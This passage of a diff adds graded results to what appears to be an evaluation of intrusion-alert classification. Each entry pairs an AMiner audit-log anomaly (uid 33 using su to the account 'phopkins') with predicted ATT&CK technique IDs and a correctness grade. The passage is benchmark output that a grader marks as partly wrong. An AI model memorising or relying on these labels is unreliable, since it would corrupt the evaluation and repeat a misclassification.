+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 19, \"AnalysisComponentType\": \"NewMatchPathValueComboDetector\", \"AnalysisComponentName\": \"AMiner: New user_acct parameter combination in Audit logs.\", \"Message\": \"New value combination(s) detected\", \"PersistenceFileName\": \"nmpvcd_user_acct\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/user_acct/uid\", \"/model/type/user_acct/msg2\", \"/model/type/user_acct/fm/acct/acct\", \"/model/type/user_acct/opt/opt_seq/exe\"], \"AffectedLogAtomValues\": [\"33\", \"'op=PAM:accounting\", \"\\\"phopkins\\\"\", \"\\\"/bin/su\\\"\"]}, \"LogData\": {\"RawLogData\": [\"type=USER_ACCT msg=audit(1642511671.635:2442): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=\\\"phopkins\\\" exe=\\\"/bin/su\\\" hostname=? addr=? terminal=/dev/pts/1 res=success'\"], \"Timestamps\": [1642511671.63], \"DetectionTimestamp\": [1642511671.63], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/audit/audit.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "line_number": 99,
+    "predicted_attack_type": [
+      "T1078.003",
+      "T1548.002"
+    ],
+    "attack_type": "privilegeescalation",
+    "classification_correct": "Partially correct classification - Incorrect id: T1548.002;",
+    "classification": "TP",
+    "description": "The log indicates a successful privilege escalation attempt using 'su' command by user 'phopkins' on the internal-employee-3 host. This is a true positive as it signifies a potential credential access and privilege escalation.",
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 25, \"AnalysisComponentType\": \"NewMatchPathValueComboDetector\", \"AnalysisComponentName\": \"AMiner: New cred_acq parameter combination in Audit logs.\", \"Message\": \"New value combination(s) detected\", \"PersistenceFileName\": \"nmpvcd_cred_acq\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/type/cred_acq/uid\", \"/model/type/cred_acq/msg2\", \"/model/type/cred_acq/fm/acct/acct\", \"/model/type/cred_acq/opt/opt_seq/exe\"], \"AffectedLogAtomValues\": [\"33\", \"'op=PAM:setcred\", \"\\\"phopkins\\\"\", \"\\\"/bin/su\\\"\"]}, \"LogData\": {\"RawLogData\": [\"type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=\\\"phopkins\\\" exe=\\\"/bin/su\\\" hostname=? addr=? terminal=/dev/pts/1 res=success'\"], \"Timestamps\": [1642511671.66], \"DetectionTimestamp\": [1642511671.66], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/audit/audit.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  }
+]
